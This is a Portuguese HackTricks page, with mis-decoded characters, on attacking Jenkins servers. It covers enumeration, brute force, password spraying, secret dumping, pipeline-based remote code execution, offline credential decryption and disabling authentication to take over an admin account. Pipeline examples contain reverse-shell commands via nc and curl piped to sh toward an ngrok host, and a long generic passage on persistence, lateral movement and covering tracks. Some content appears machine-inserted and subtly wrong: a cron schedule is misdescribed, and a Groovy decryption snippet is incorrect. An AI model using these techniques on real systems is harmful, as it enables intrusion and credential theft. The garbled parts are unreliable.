# Seguran√ßa do Jenkins

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acessar a **vers√£o mais recente do PEASS ou baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

## Informa√ß√µes b√°sicas

O Jenkins oferece uma maneira simples de configurar um ambiente de **integra√ß√£o cont√≠nua** ou **entrega cont√≠nua** (CI/CD) para quase **qualquer** combina√ß√£o de **linguagens** e reposit√≥rios de c√≥digo-fonte usando pipelines, al√©m de automatizar outras tarefas de desenvolvimento rotineiras. Embora o Jenkins n√£o elimine a **necessidade de criar scripts para etapas individuais**, ele oferece uma maneira mais r√°pida e robusta de integrar toda a cadeia de ferramentas de compila√ß√£o, teste e implanta√ß√£o do que voc√™ pode construir facilmente por conta pr√≥pria.\
Defini√ß√£o da [qui](https://www.infoworld.com/article/3239666/what-is-jenkins-the-ci-server-explained.html).

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## Enumera√ß√£o n√£o autenticada

Para pesquisar por p√°ginas interessantes do Jenkins sem autentica√ß√£o como (_/people_ ou _/asynchPeople_, que lista os usu√°rios atuais), voc√™ pode usar:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
Verifique se √© poss√≠vel executar comandos sem precisar de autentica√ß√£o:
```
msf> use auxiliary/scanner/http/jenkins_command
```
Sem credenciais, voc√™ pode olhar dentro do caminho _**/asynchPeople/**_ ou _**/securityRealm/user/admin/search/index?q=**_ para **nomes de usu√°rio**.

Voc√™ pode obter a vers√£o do Jenkins a partir do caminho _**/oops**_ ou _**/error**_

![](<../../.gitbook/assets/image (48).png>)

### Vulnerabilidades Conhecidas

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## Login

Nas informa√ß√µes b√°sicas, voc√™ pode verificar **todas as formas de fazer login no Jenkins**:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Registro

Voc√™ poder√° encontrar inst√¢ncias do Jenkins que **permitem que voc√™ crie uma conta e fa√ßa login nela. √â simples assim.**

### **Login SSO**

Tamb√©m, se a **funcionalidade/plugins SSO** estiverem presentes, voc√™ deve tentar fazer **login** na aplica√ß√£o usando uma conta de teste (por exemplo, uma conta de teste do **Github/Bitbucket**). Truque da [**qui**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### For√ßa Bruta

O **Jenkins** n√£o implementa nenhuma **pol√≠tica de senha** ou **mitiga√ß√£o de for√ßa bruta de nomes de usu√°rio**. Portanto, voc√™ sempre deve tentar fazer **for√ßa bruta** nos usu√°rios, pois provavelmente senhas **fracas** est√£o sendo usadas (at√© mesmo **nomes de usu√°rio como senhas** ou **nomes de usu√°rio invertidos como senhas**).
```
msf> use auxiliary/scanner/http/jenkins_login
```
### Password spraying

Use [este script python](https://github.com/gquere/pwn_jenkins/blob/master/password_spraying/jenkins_password_spraying.py) ou [este script powershell](https://github.com/chryzsh/JenkinsPasswordSpray).

### Bypass de Whitelist de IP

Muitas organiza√ß√µes combinam **sistemas de gerenciamento de controle de origem (SCM) baseados em SaaS** (como GitHub ou GitLab) com uma solu√ß√£o **CI** interna e auto-hospedada (por exemplo, Jenkins, TeamCity), permitindo que esses sistemas CI **recebam eventos de webhook dos fornecedores de controle de origem SaaS**, com o simples prop√≥sito de acionar jobs de pipeline.

Portanto, as organiza√ß√µes **incluem na lista branca** os **intervalos de IP** do **SCM**, permitindo que eles acessem o sistema CI **interno** com **webhooks**. No entanto, observe como **qualquer pessoa** pode criar uma **conta** no Github ou Gitlab e fazer com que ela **acione um webhook** que poderia enviar uma solicita√ß√£o para esse **sistema CI interno**.

{% content-ref url="scm-ip-whitelisting-bypass.md" %}
[scm-ip-whitelisting-bypass.md](scm-ip-whitelisting-bypass.md)
{% endcontent-ref %}

## Abusos Internos do Jenkins

Nesses cen√°rios, vamos supor que voc√™ tenha uma conta v√°lida para acessar o Jenkins.

{% hint style="warning" %}
Dependendo do mecanismo de **Autoriza√ß√£o** configurado no Jenkins e da permiss√£o do usu√°rio comprometido, voc√™ **pode ou n√£o ser capaz de realizar os ataques a seguir**.
{% endhint %}

Para mais informa√ß√µes, verifique as informa√ß√µes b√°sicas:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Listando usu√°rios

Se voc√™ acessou o Jenkins, pode listar outros usu√°rios registrados em [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)

### Extraindo builds para encontrar segredos em texto claro

Use [este script](https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py) para extrair sa√≠das de console de builds e vari√°veis de ambiente de build na esperan√ßa de encontrar segredos em texto claro.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **Roubo de Credenciais SSH**

Se o usu√°rio comprometido tiver **privil√©gios suficientes para criar/modificar um novo n√≥ do Jenkins** e as credenciais SSH j√° estiverem armazenadas para acessar outros n√≥s, ele poder√° **roubar essas credenciais** criando/modificando um n√≥ e **configurando um host que registrar√° as credenciais** sem verificar a chave do host:

![](<../../.gitbook/assets/image (56).png>)

Normalmente, voc√™ encontrar√° as credenciais SSH do Jenkins em um **provedor global** (`/credentials/`), ent√£o voc√™ tamb√©m pode extrair essas informa√ß√µes como faria com qualquer outro segredo. Mais informa√ß√µes na se√ß√£o [**Extraindo segredos**](./#dumping-secrets).

### **RCE no Jenkins**

Obter um **shell no servidor Jenkins** d√° ao atacante a oportunidade de vazar todos os **segredos** e **vari√°veis de ambiente** e **explorar outras m√°quinas** localizadas na mesma rede ou at√© mesmo **obter credenciais de nuvem**.

Por padr√£o, o Jenkins ir√° **"executar como sistema" as builds**. Em outras palavras, eles atribuem isso ao usu√°rio **SYSTEM com todos os privil√©gios**, o que significa que qualquer a√ß√£o executada durante a build tem permiss√£o para fazer o que quiser.

### **RCE Criando/Modificando um projeto**

Criar/Modificar um projeto √© uma maneira de obter RCE no servidor Jenkins:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **RCE Executando um script Groovy**

Voc√™ tamb√©m pode obter RCE executando um script Groovy, o que pode ser mais furtivo do que criar um novo projeto:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### RCE Criando/Modificando um Pipeline

Voc√™ tamb√©m pode obter **RCE criando/modificando um pipeline**:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Explora√ß√£o de Pipelines

Para explorar pipelines, voc√™ ainda precisa ter acesso ao Jenkins.

### Pipelines de Build

**Pipelines** tamb√©m podem ser usados como **mecanismo de build em projetos**, nesse caso, pode ser configurado um **arquivo dentro do reposit√≥rio** que cont√©m a sintaxe do pipeline. Por padr√£o, √© usado `/Jenkinsfile`:

![](<../../.gitbook/assets/image (14) (1) (1).png>)

Tamb√©m √© poss√≠vel **armazenar arquivos de configura√ß√£o de pipeline em outros locais** (em outros reposit√≥rios, por exemplo) com o objetivo de **separar** o **acesso** ao reposit√≥rio e o acesso ao pipeline.

Se um atacante tiver **acesso de grava√ß√£o a esse arquivo**, ele poder√° **modific√°-lo** e **potencialmente acionar** o pipeline sem nem mesmo ter acesso ao Jenkins.\
√â poss√≠vel que o atacante precise **burlar algumas prote√ß√µes de branch** (dependendo da plataforma e dos privil√©gios do usu√°rio, elas podem ser burladas ou n√£o).

Os gatilhos mais comuns para executar um pipeline personalizado s√£o:

* **Pull request** para o branch principal (ou potencialmente para outros branches)
* **Push para o branch principal** (ou potencialmente para outros branches)
* **Atualizar o branch principal** e aguardar at√© que seja executado de alguma forma

{% hint style="info" %}
Se voc√™ √© um **usu√°rio externo**, n√£o espere criar um **PR para o branch principal** do reposit√≥rio de **outro usu√°rio/organiza√ß√£o** e **acionar o pipeline**... mas se estiver **mal configurado**, voc√™ pode comprometer completamente empresas apenas explorando isso.
{% endhint %}

### RCE no Pipeline

Na se√ß√£o anterior sobre RCE, j√° foi indicada uma t√©cnica para [**obter RCE modificando um pipeline**](./#rce-creating-modifying-pipeline).

### Verificando as Vari√°veis de Ambiente

√â poss√≠vel declarar **vari√°veis de ambiente em texto claro** para todo o pipeline ou para est√°gios espec√≠ficos. Essas vari√°veis de ambiente **n√£o devem conter informa√ß√µes sens√≠veis**, mas um atacante sempre pode **verificar todas as configura√ß√µes do pipeline**/Jenkinsfiles:
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### Vazamento de segredos

Para obter informa√ß√µes sobre como os segredos s√£o normalmente tratados pelo Jenkins, consulte as informa√ß√µes b√°sicas:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

As credenciais podem ser **escopadas para provedores globais** (`/credentials/`) ou para **projetos espec√≠ficos** (`/job/<nome-do-projeto>/configure`). Portanto, para extrair todas elas, voc√™ precisa **comprometer pelo menos todos os projetos** que cont√™m segredos e executar pipelines personalizadas/envenenadas.

H√° outro problema, para obter um **segredo dentro do env** de um pipeline, voc√™ precisa **saber o nome e o tipo do segredo**. Por exemplo, se voc√™ tentar **carregar** um **segredo `usernamePassword`** como um **segredo `string`**, voc√™ receber√° este **erro**:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
Aqui est√° a maneira de carregar alguns tipos comuns de segredos:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
No final desta p√°gina, voc√™ pode **encontrar todos os tipos de credenciais**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
A melhor maneira de **extrair todas as senhas de uma vez** √© **comprometendo** a m√°quina do **Jenkins** (executando um shell reverso no **n√≥ integrado**, por exemplo) e, em seguida, **vazando** as **chaves mestras** e as **senhas criptografadas** e descriptografando-as offline.\
Mais informa√ß√µes sobre como fazer isso na se√ß√£o [Nodes & Agents](./#nodes-and-agents) e na se√ß√£o [P√≥s-Explora√ß√£o](./#post-exploitation).
{% endhint %}

### Gatilhos

De acordo com [a documenta√ß√£o](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers): A diretiva `triggers` define as **formas automatizadas em que o Pipeline deve ser reativado**. Para Pipelines integrados com uma fonte como GitHub ou BitBucket, `triggers` podem n√£o ser necess√°rios, pois a integra√ß√£o baseada em webhooks provavelmente j√° estar√° presente. Os gatilhos atualmente dispon√≠veis s√£o `cron`, `pollSCM` e `upstream`.

Exemplo de cron:
```bash
triggers { cron('H */4 * * 1-5') }
```
Verifique **outros exemplos na documenta√ß√£o**.

### N√≥s e Agentes

Uma **inst√¢ncia do Jenkins** pode ter **agentes diferentes executando em m√°quinas diferentes**. Do ponto de vista de um atacante, o acesso a diferentes m√°quinas significa **diferentes credenciais de nuvem potenciais** para roubar ou **diferente acesso √† rede** que poderia ser abusado para explorar outras m√°quinas.

Para mais informa√ß√µes, verifique as informa√ß√µes b√°sicas:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Voc√™ pode enumerar os **n√≥s configurados** em `/computer/`, voc√™ geralmente encontrar√° o **`N√≥ Incorporado`** (que √© o n√≥ executando o Jenkins) e potencialmente mais:

![](<../../.gitbook/assets/image (25).png>)

√â **especialmente interessante comprometer o n√≥ incorporado** porque ele cont√©m informa√ß√µes sens√≠veis do Jenkins.

Para indicar que voc√™ deseja **executar** o **pipeline** no **n√≥ incorporado do Jenkins**, voc√™ pode especificar dentro do pipeline a seguinte configura√ß√£o:
```bash
pipeline {
agent {label 'built-in'}
```
### Exemplo completo

Pipeline em um agente espec√≠fico, com um gatilho cron, com vari√°veis de ambiente de pipeline e est√°gio, carregando 2 vari√°veis em uma etapa e enviando um shell reverso:

```groovy
pipeline {
    agent {
        label 'specific-agent'
    }
    triggers {
        cron('H 0 * * 1-5')
    }
    environment {
        PIPELINE_VARIABLE = 'value'
    }
    stages {
        stage('Example Stage') {
            environment {
                STAGE_VARIABLE = 'value'
            }
            steps {
                script {
                    def variable1 = 'value1'
                    def variable2 = 'value2'
                    sh "echo $variable1"
                    sh "echo $variable2"
                    sh "nc -e /bin/sh <attacker-ip> <attacker-port>"
                }
            }
        }
    }
}
```

Este √© um exemplo completo de um pipeline no Jenkins. Ele √© executado em um agente espec√≠fico, com um gatilho cron que dispara a cada hora √†s segundas-feiras at√© sextas-feiras. O pipeline define duas vari√°veis de ambiente, uma para o pipeline em si e outra para o est√°gio espec√≠fico. Em seguida, ele executa uma etapa que carrega duas vari√°veis locais e as imprime no console. Por fim, ele executa um comando para enviar um shell reverso para um endere√ßo IP e porta espec√≠ficos.
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
O Metasploit √© uma ferramenta de c√≥digo aberto amplamente utilizada para testes de penetra√ß√£o e p√≥s-explora√ß√£o. Ele fornece uma ampla gama de m√≥dulos e exploits que podem ser usados para explorar vulnerabilidades em sistemas alvo.

#### Obtendo acesso persistente

Uma vez que um invasor tenha obtido acesso a um sistema alvo, o pr√≥ximo passo √© garantir acesso persistente. Isso envolve a cria√ß√£o de um backdoor ou um mecanismo que permita ao invasor acessar o sistema mesmo ap√≥s um rein√≠cio ou uma desconex√£o.

O Metasploit oferece v√°rias op√ß√µes para obter acesso persistente, como:

- Adicionar uma entrada de registro para executar um payload sempre que o sistema for reiniciado.
- Modificar arquivos de inicializa√ß√£o para executar um payload durante o processo de inicializa√ß√£o.
- Criar um servi√ßo do Windows para executar um payload em segundo plano.

Essas t√©cnicas permitem que o invasor mantenha o acesso ao sistema alvo mesmo ap√≥s a explora√ß√£o inicial.

#### Movendo lateralmente

Uma vez que um invasor tenha acesso persistente a um sistema, ele pode come√ßar a se mover lateralmente pela rede. Isso envolve a explora√ß√£o de outros sistemas na mesma rede para expandir o acesso e obter informa√ß√µes adicionais.

O Metasploit fornece v√°rios m√≥dulos que podem ser usados para mover lateralmente, como:

- Exploits para vulnerabilidades conhecidas em sistemas operacionais e aplicativos.
- Ferramentas de escalonamento de privil√©gios para obter privil√©gios mais altos em sistemas comprometidos.
- Ferramentas de enumera√ß√£o de rede para descobrir outros sistemas na rede.

Essas t√©cnicas permitem que o invasor se mova pela rede e comprometa outros sistemas, aumentando ainda mais seu acesso e controle.

#### Coleta de informa√ß√µes

Durante o processo de p√≥s-explora√ß√£o, √© importante coletar informa√ß√µes sobre o sistema alvo e a rede em que ele est√° localizado. Isso pode incluir informa√ß√µes sobre usu√°rios, senhas, configura√ß√µes de seguran√ßa e outros detalhes relevantes.

O Metasploit oferece v√°rias ferramentas e m√≥dulos para coleta de informa√ß√µes, como:

- Ferramentas de enumera√ß√£o de servi√ßos para descobrir quais servi√ßos est√£o em execu√ß√£o em um sistema.
- Ferramentas de enumera√ß√£o de usu√°rios para descobrir informa√ß√µes sobre os usu√°rios do sistema.
- Ferramentas de enumera√ß√£o de senhas para tentar adivinhar senhas fracas ou vazadas.

Essas t√©cnicas permitem que o invasor obtenha informa√ß√µes valiosas que podem ser usadas para comprometer ainda mais o sistema alvo ou outros sistemas na rede.

#### Encobrindo rastros

Ap√≥s explorar um sistema e obter acesso persistente, √© importante para o invasor encobrir seus rastros para evitar detec√ß√£o. Isso envolve a remo√ß√£o de evid√™ncias de atividade maliciosa e a manipula√ß√£o de logs e registros do sistema.

O Metasploit oferece v√°rias ferramentas e m√≥dulos para encobrir rastros, como:

- Ferramentas de limpeza de logs para remover registros de atividade maliciosa.
- Ferramentas de manipula√ß√£o de registros para alterar ou excluir registros do sistema.
- Ferramentas de ofusca√ß√£o de arquivos para ocultar arquivos maliciosos.

Essas t√©cnicas permitem que o invasor minimize a chance de ser detectado e continue a operar no sistema alvo sem levantar suspeitas.
```
msf> post/multi/gather/jenkins_gather
```
### Segredos do Jenkins

Voc√™ pode listar os segredos acessando `/credentials/` se tiver permiss√µes suficientes. Observe que isso listar√° apenas os segredos dentro do arquivo `credentials.xml`, mas os **arquivos de configura√ß√£o de compila√ß√£o** tamb√©m podem ter **mais credenciais**.

Se voc√™ pode **ver a configura√ß√£o de cada projeto**, tamb√©m pode ver l√° os **nomes das credenciais (segredos)** sendo usados para acessar o reposit√≥rio e **outras credenciais do projeto**.

![](<../../.gitbook/assets/image (9) (1) (1).png>)

#### A partir do Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### A partir do disco

Esses arquivos s√£o necess√°rios para **descriptografar os segredos do Jenkins**:

* secrets/master.key
* secrets/hudson.util.Secret

Tais **segredos geralmente podem ser encontrados em**:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

Aqui est√° uma regex para encontr√°-los:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Descriptografar segredos do Jenkins offline

Se voc√™ tiver obtido os **senhas necess√°rias para descriptografar os segredos**, use [**este script**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) **para descriptografar esses segredos**.
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### Descriptografar segredos do Jenkins a partir do Groovy

Se voc√™ estiver realizando testes de penetra√ß√£o em um ambiente Jenkins, pode ser √∫til descriptografar os segredos armazenados no Jenkins para obter acesso a informa√ß√µes sens√≠veis. O Jenkins armazena os segredos criptografados em seu arquivo de configura√ß√£o `secrets.groovy`.

Para descriptografar os segredos, voc√™ pode usar o seguinte c√≥digo Groovy:

```groovy
import hudson.util.Secret

def secrets = new File("${JENKINS_HOME}/secrets/")

secrets.eachFile { file ->
    def secret = Secret.decrypt(file.text)
    println "Secret: ${secret}"
}
```

Este c√≥digo percorre todos os arquivos no diret√≥rio `secrets` do Jenkins e descriptografa o conte√∫do de cada arquivo usando a classe `Secret` do Jenkins. Em seguida, imprime o segredo descriptografado no console.

Lembre-se de que, ao realizar testes de penetra√ß√£o, voc√™ deve ter permiss√£o legal para acessar e manipular os sistemas e dados envolvidos. O uso indevido dessas t√©cnicas pode ser ilegal e sujeito a penalidades.
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### Criar novo usu√°rio administrador

1. Acesse o arquivo config.xml do Jenkins em `/var/lib/jenkins/config.xml` ou `C:\Program Files (x86)\Jenkis\`
2. Procure pela palavra `<useSecurity>true</useSecurity>` e altere a palavra **`true`** para **`false`**.
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Reinicie** o servidor **Jenkins**: `service jenkins restart`
4. Agora volte para o portal do Jenkins e **o Jenkins n√£o solicitar√° mais credenciais** desta vez. Navegue at√© "**Gerenciar Jenkins**" para definir a **senha do administrador novamente**.
5. **Ative** a **seguran√ßa** novamente alterando as configura√ß√µes para `<useSecurity>true</useSecurity>` e **reinicie o Jenkins novamente**.

## Refer√™ncias

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>
